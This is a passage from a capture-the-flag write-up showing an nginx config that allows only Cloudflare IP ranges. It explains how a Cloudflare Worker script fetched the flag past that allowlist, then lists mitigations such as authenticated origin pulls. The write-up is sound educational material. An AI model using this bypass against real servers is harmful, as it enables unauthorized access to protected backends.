    allow 192.168.0.0/16;


    # Cloudflare IPs
    allow 103.21.244.0/22;
    allow 103.22.200.0/22;
    allow 103.31.4.0/22;
    allow 104.16.0.0/13;
    allow 104.24.0.0/14;
    allow 108.162.192.0/18;
    allow 131.0.72.0/22;
    allow 141.101.64.0/18;
    allow 162.158.0.0/15;
    allow 172.64.0.0/13;
    allow 173.245.48.0/20;
    allow 188.114.96.0/20;
    allow 190.93.240.0/20;
    allow 197.234.240.0/22;
    allow 198.41.128.0/17;

    deny all;
```

The config defines what IP addresses are allowed to make requests to the backend API.
Because our local test environment was running on localhost, we were able to fetch the flag directly but not on the challenge server.
And since the proxy allows connections from Cloudflare's IP address pool, we can bypass the 403 forbidden error by sending a request from Cloudflare's servers.
During the event, I tried using Cloudflare WARP but Cloudflare puts WARP users in a different address pool that was not in the allowed list.

The workaround was to use [Cloudflare Workers](https://workers.cloudflare.com/) to fetch the flag from the flag API.

```js
export default {
    async fetch(request, env, ctx) {
      const response = await fetch("http://microservices-challenge.eqctf.com:5555/flag", {
        method: "GET",
        headers: {
          "Accept": "application/json",
        },
      });
  
      const data = await response.text();
      return new Response(data, {
        headers: { "Content-Type": "text/plain" },
      });
    },
  };
```

![](/assets/img/2025-04-13-umcsctf-2025-prelims/microservices.png)

I highly recommend reading [this blog post](https://javan.de/relying-solely-on-ip-allowlisting-with-cloudflare-is-wrong/) from Javan Rasokat that goes through the attack scenario in detail.
In short, we shouldn't put too much trust into allowlisting IP addresses as a security measure, but use it as a defense-in-depth.
To mitigate against this attack scenario, it is recommended to implement custom certificates for [authenticated origin pools](https://developers.cloudflare.com/ssl/origin-configuration/authenticated-origin-pull/explanation/), and configure host header validation on the origin server to only accept requests from verified domains.